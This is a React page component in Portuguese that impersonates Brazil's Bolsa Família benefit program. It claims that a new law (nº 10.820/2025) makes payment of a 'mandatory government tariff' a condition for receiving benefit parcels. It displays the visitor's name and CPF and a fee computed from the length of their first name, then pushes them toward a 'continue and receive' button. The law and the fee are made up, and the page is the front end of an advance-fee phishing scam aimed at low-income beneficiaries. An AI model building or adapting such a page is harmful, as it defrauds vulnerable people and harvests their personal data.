import { useState, useEffect } from 'react';
import { useLocation } from 'wouter';
import { ArrowRight, HelpCircle, AlertTriangle } from 'lucide-react';
import { useUserStore } from '../store/userStore';
import { motion } from 'framer-motion';

export default function TarifaGoverno() {
  const [, navigate] = useLocation();
  const { userData } = useUserStore();
  const [expandExplanation, setExpandExplanation] = useState(false);
  const [isPageLoaded, setIsPageLoaded] = useState(false);

  // Animação inicial ao carregar a página
  useEffect(() => {
    setIsPageLoaded(true);
  }, []);

  // Obter apenas o primeiro nome
  const primeiroNome = userData.nome.split(' ')[0];
  
  // Valor da tarifa baseado no nome do usuário (para fins de demonstração)
  const valorTarifa = Math.floor((primeiroNome.length * 10 + 27) * 1.23);

  const toggleExplanation = () => {
    setExpandExplanation(!expandExplanation);
  };

  const handleContinuar = () => {
    navigate('/');
  };

  // Estilos de cores para ícones 
  const iconColors = [
    '#FFCC00', // amarelo
    '#00CC66', // verde
    '#FF6633', // laranja
    '#3366FF', // azul
    '#FF33CC', // rosa
  ];

  return (
    <div className="min-h-screen bg-white">
      {/* Cabeçalho decorativo com ícones coloridos */}
      <div className="w-full overflow-hidden">
        <motion.div 
          className="flex py-2"
          initial={{ x: -500 }}
          animate={{ x: 0 }}
          transition={{ duration: 0.8, ease: "easeOut" }}
        >
          {[...Array(15)].map((_, i) => (
            <motion.div 
              key={i}
              className="w-8 h-8 mx-1 flex-shrink-0"
              style={{ 
                background: iconColors[i % iconColors.length],
                clipPath: i % 5 === 0 ? 'polygon(50% 0%, 100% 50%, 50% 100%, 0% 50%)' : 
                           i % 5 === 1 ? 'circle(50% at 50% 50%)' : 
                           i % 5 === 2 ? 'polygon(50% 0%, 100% 38%, 82% 100%, 18% 100%, 0% 38%)' :
                           i % 5 === 3 ? 'polygon(0% 0%, 100% 0%, 100% 100%, 0% 100%)' :
                           'polygon(50% 0%, 100% 100%, 0% 100%)'
              }}
              whileHover={{ rotate: 180, scale: 1.1 }}
              transition={{ duration: 0.3 }}
            />
          ))}
        </motion.div>
      </div>

      {/* Cabeçalho do comunicado */}
      <div className="flex items-center justify-between p-4 border-b border-gray-200">
        <motion.div 
          className="flex items-center"
          initial={{ opacity: 0, x: -20 }}
          animate={{ opacity: 1, x: 0 }}
          transition={{ delay: 0.3, duration: 0.5 }}
        >
          <div className="flex flex-col">
            <div className="text-2xl font-bold tracking-tighter">COMUNICADO</div>
            <div className="px-2 py-0.5 bg-yellow-400 font-bold text-black inline-block">
              IMPORTANTE
            </div>
          </div>
        </motion.div>
        
        <motion.div 
          className="flex items-end"
          initial={{ opacity: 0, x: 20 }}
          animate={{ opacity: 1, x: 0 }}
          transition={{ delay: 0.3, duration: 0.5 }}
        >
          <div className="flex flex-col items-end">
            <div className="text-sm uppercase tracking-widest text-gray-700">PROGRAMA</div>
            <div className="flex items-baseline">
              <span className="text-2xl font-bold text-blue-700">B</span>
              <span className="text-2xl font-bold text-green-600">O</span>
              <span className="text-2xl font-bold text-yellow-500">L</span>
              <span className="text-2xl font-bold text-red-600">S</span>
              <span className="text-2xl font-bold text-purple-600">A</span>
              <span className="text-3xl font-bold italic ml-1 text-black">família</span>
            </div>
          </div>
        </motion.div>
      </div>

      {/* Título principal */}
      <motion.div 
        className="w-full bg-yellow-400 py-3 px-4 my-4"
        initial={{ opacity: 0, y: -20 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ delay: 0.6, duration: 0.5 }}
      >
        <h1 className="text-xl font-bold text-black">
          Tarifa do Imposto obrigatório!
        </h1>
      </motion.div>

      <div className="p-4">
        {/* Box laranja com aviso */}
        <motion.div 
          className="bg-[#ff8a33] text-white p-4 rounded-lg mb-6 shadow-md"
          initial={{ opacity: 0, scale: 0.9 }}
          animate={{ opacity: 1, scale: 1 }}
          transition={{ delay: 0.8, duration: 0.5 }}
        >
          <div className="flex items-start">
            <AlertTriangle className="h-6 w-6 mr-2 flex-shrink-0 mt-1" />
            <p className="font-medium">
              De acordo com a nova Lei (nº 10.820/2025) imposta pelo governo, é exigido que as parcelas do Bolsa Família de 2025 só sejam pagas aos que contribuírem com as tarifas governamentais.
            </p>
          </div>
        </motion.div>

        {/* Texto principal */}
        <motion.div 
          className="mb-6"
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ delay: 1, duration: 0.5 }}
        >
          <p className="text-lg font-bold mb-3">
            Para liberação do pagamento das parcelas do programa Bolsa Família, se tornou obrigatória a contribuição do cidadão com o imposto governamental.
          </p>
          
          <p className="mb-4">
            <span className="font-bold">Caso o pagamento não for feito</span>, o cidadão perderá o direito de receber o benefício.
          </p>

          {/* Detalhes da tarifa do usuário */}
          <motion.div 
            className="bg-gray-100 p-4 rounded-lg mb-6 border-l-4 border-yellow-500"
            whileHover={{ scale: 1.02 }}
            transition={{ duration: 0.2 }}
          >
            <h3 className="font-bold text-lg mb-2">Detalhes da sua tarifa:</h3>
            <p className="mb-1">Nome: <span className="font-medium">{userData.nome || 'Usuário'}</span></p>
            <p className="mb-1">CPF: <span className="font-medium">{userData.cpf || '000.000.000-00'}</span></p>
            <p className="mb-3">Valor da tarifa: <span className="font-bold text-xl text-green-600">R$ {valorTarifa},00</span></p>
            <p className="text-sm text-gray-600">Valor calculado de acordo com o perfil do beneficiário.</p>
          </motion.div>
        </motion.div>

        {/* Explicação expansível */}
        <motion.div 
          className="mb-8 bg-white border border-gray-200 rounded-lg overflow-hidden"
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ delay: 1.2, duration: 0.5 }}
        >
          <button 
            className="w-full p-4 flex items-center justify-between bg-gray-50 hover:bg-gray-100 transition-colors"
            onClick={toggleExplanation}
          >
            <div className="flex items-center">
              <HelpCircle className="h-5 w-5 mr-2 text-blue-600" />
              <span className="font-medium">O que é essa tarifa?</span>
            </div>
            <motion.div
              animate={{ rotate: expandExplanation ? 180 : 0 }}
              transition={{ duration: 0.3 }}
            >
              <ArrowRight className="h-5 w-5" />
            </motion.div>
          </button>
          
          {expandExplanation && (
            <motion.div 
              className="p-4 bg-white"
              initial={{ height: 0, opacity: 0 }}
              animate={{ height: 'auto', opacity: 1 }}
              transition={{ duration: 0.3 }}
            >
              <p className="mb-4">
                É o imposto obrigatório para manter o sistema governamental funcionando, de acordo com o valor que você tem a receber...
              </p>
              <p>
                E essa tarifa só precisa ser paga uma única vez e o cidadão poderá receber o pagamento das parcelas do ano inteiro.
              </p>
            </motion.div>
          )}
        </motion.div>
        
        {/* Botão de continuar */}
        <motion.button
          className="w-full py-4 bg-[#ee8435] text-white font-bold rounded-md hover:bg-[#df7426] uppercase flex items-center justify-center"
          onClick={handleContinuar}
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          transition={{ delay: 1.4, duration: 0.5 }}
          whileHover={{ scale: 1.03 }}
          whileTap={{ scale: 0.98 }}
        >
          CONTINUAR E RECEBER
          <ArrowRight className="ml-2 h-5 w-5" />
        </motion.button>
      </div>
    </div>
  );
}